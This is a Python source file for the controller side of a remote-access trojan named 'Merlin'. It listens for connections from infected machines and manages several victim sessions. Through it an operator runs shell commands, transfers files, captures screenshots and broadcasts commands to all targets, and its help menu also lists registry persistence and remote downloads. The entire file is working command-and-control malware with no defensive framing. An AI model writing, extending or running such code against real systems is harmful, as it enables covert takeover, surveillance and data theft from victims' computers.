#!/usr/bin/python3

import socket
from termcolor import colored
import json
import os
import threading

def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def target_communication(target, ip):
    count = 0
    while True:
        command = input('|\/|%s > ' % str(ip))
        reliable_send(target, command)
        if command == 'quit':
            break
        elif command == 'background':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(target, command[7:])
        elif command[:8] == 'download':
            download_file(target, command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif command == 'help':
            print(colored('''\n
            quit                                --> Quit Session With The Target
            clear                               --> Clear The Screen
            cd *Directory Name*                 --> Changes Directory On Target System
            upload *file name*                  --> Upload File To The target Machine
            download *file name*                --> Download File From Target Machine
            persistence *RegName* *fileName*    --> Create Persistence In Registry
            screenshot                          --> Takes Screenshot of Victim Machine
            get *URL*                           --> Downloads File From Specified URL
            check                               --> Checks For Admin Previleges\n''', 'green'))
        else:
            result = reliable_recv(target)
            print(result)

def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(colored(str(ip) + ' Has Been Infected!!', 'green'))
        except:
            pass


targets = []
ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('<your ip>', <your port>))
sock.listen(5)
t1 = threading.Thread(target=accept_connections)
t1.start()
print(colored('         |\/|erlin Started           ', 'green', attrs=['blink']))

while True:
    command = input(colored('|\/| > ', 'green'))
    if command == 'targets':
        counter = 0
        for ip in ips:
            print('Session ' + str(counter) + ' --- ' + str(ip))
            counter += 1
    elif command == 'clear':
        os.system('clear')
    elif command[:7] == 'session':
        try:
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            target_communication(tarnum, tarip)
        except:
            print(colored('[-] No Session Under That ID Number [-]', 'red'))
    elif command == 'exit':
        for target in targets:
            reliable_send(target, 'quit')
            target.close()
        sock.close()
        stop_flag = True
        t1.join()
        break
    elif command[:4] == 'kill':
        targ = targets[int(command[5:])]
        ip = ips[int(command[5:])]
        reliable_send(targ, 'quit')
        targ.close()
        targets.remove(targ)
        ips.remove(ip)
    elif command[:7] == 'sendall':
        x = len(targets)
        print(x)
        i = 0
        try:
            while i < x:
                tarnumber = targets[i]
                print(tarnumber)
                reliable_send(tarnumber, command)
                i += 1
        except:
            print(colored('[-] Failed [-]', 'red'))
    elif command == 'help':
            print(colored('''\n
            targets                 --> Shows The Targets Which Are Connected
            clear                   --> Clears The Screen
            session *ID*            --> Enters The Given Target
            exit                    --> Closes The Server
            kill *ID*               --> Kills a specific Target
            sendall *command*       --> Sends a specific command to all the Targets\n''', 'green'))
    else:
        print(colored('[-] Command Doesnt Exist [-]', 'red'))

